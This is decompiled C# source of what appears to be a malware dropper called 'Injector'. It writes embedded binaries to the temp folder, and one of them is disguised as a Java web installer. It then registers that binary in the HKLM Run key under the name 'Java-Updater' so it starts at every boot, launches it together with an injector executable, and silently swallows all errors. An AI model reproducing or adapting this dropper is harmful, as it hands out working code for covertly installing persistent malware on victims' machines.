using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Injector.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Injector;

[StandardModule]
internal sealed class Module1
{
	private static string DLLpath;

	private static string ServerPath;

	private static string InjectorPath;

	[STAThread]
	public static void Main()
	{
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		if (File.Exists(Application.get_StartupPath() + "\\SMWA.dll"))
		{
			InjectorPath = Path.GetTempPath() + "\\Winject.exe";
			ServerPath = Path.GetTempPath() + "\\java-jdre-0.5.68-en-webinstall.exe";
			DLLpath = Path.GetTempPath() + "\\SMWA.dll";
			try
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
				object[] array = new object[2] { "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Java-Updater", ServerPath };
				bool[] array2 = new bool[2] { false, true };
				NewLateBinding.LateCall(objectValue, (Type)null, "RegWrite", array, (string[])null, (Type[])null, array2, true);
				if (array2[1])
				{
					ServerPath = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[1]), typeof(string));
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				File.WriteAllBytes(InjectorPath, Resource.Winject);
				File.WriteAllBytes(ServerPath, Resource.raperjo);
				File.WriteAllBytes(DLLpath, Resource.SMWA);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				Process.Start(InjectorPath);
				Process.Start(ServerPath);
				return;
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				return;
			}
		}
		Interaction.MsgBox((object)"No dll was found...", (MsgBoxStyle)0, (object)"ERROR!");
	}
}
